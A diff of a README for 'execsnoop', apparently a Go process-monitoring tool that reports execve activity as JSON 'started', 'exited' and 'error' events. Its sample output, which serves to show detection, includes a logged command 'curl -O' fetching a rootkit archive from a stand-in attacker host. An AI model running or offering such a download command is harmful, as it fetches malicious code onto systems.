@@ -39,24 +39,69 @@ In order to run the `execsnoop` example the `CAP_SYS_ADMIN` capability is
 required. Therefore the program should be run as root.
 
 ```
-sudo $GOPATH/bin/execsnoop -json
+sudo $GOPATH/bin/execsnoop
 ```
 
 Then in a second terminal if you run a program you will see info about all
-the `execve` syscalls. For example
+the processes. The program outputs JSON events. There are three
+different event types -- `started`, `exited`, and `error`.
+
+- `started` - This event is generated at startup for all existing processes by
+reading from `/proc` and it is generated anytime there is a successful `execve`
+syscall.
+- `exited` - This event is generated when a program exits. It contains the same
+data as the `started` event along with the end time and elapsed running time.
+- `error` - This event is generated when an `execve` syscall results in an
+error. For example if `execve` fails because the user does not have permissions
+to execute the binary then an error event will be generated with the
+`error_code` value.
 
 ```json
+$ sudo $GOPATH/bin/execsnoop | jq .
 {
-  "pid": 32438,
+  "type": "started",
+  "start_time": "2017-11-03T15:16:56.890551865Z",
+  "ppid": 15785,
+  "parent_comm": "bash",
+  "pid": 22022,
   "uid": 1000,
   "gid": 1000,
+  "exe": "/usr/bin/curl",
+  "args": [
+    "curl",
+    "-O",
+    "https://badguy.com/rootkit.tar.gz"
+  ]
+}
+{
+  "type": "exited",
+  "start_time": "2017-11-03T15:16:56.890551865Z",
+  "ppid": 15785,
   "parent_comm": "bash",
+  "pid": 22022,
+  "uid": 1000,
+  "gid": 1000,
   "exe": "/usr/bin/curl",
   "args": [
     "curl",
     "-O",
     "https://badguy.com/rootkit.tar.gz"
   ],
-  "return_code": 0
+  "end_time": "2017-11-03T15:16:56.908970285Z",
+  "running_time_ns": 18418420
+}
+{
+  "type": "error",
+  "start_time": "2017-11-03T15:17:18.103922381Z",
+  "ppid": 15785,
+  "parent_comm": "bash",
+  "pid": 22024,
+  "uid": 1000,
+  "gid": 1000,
+  "exe": "/sbin/unix_update",
+  "args": [
+    "/sbin/unix_update"
+  ],
+  "error_code": -13
 }
 ```
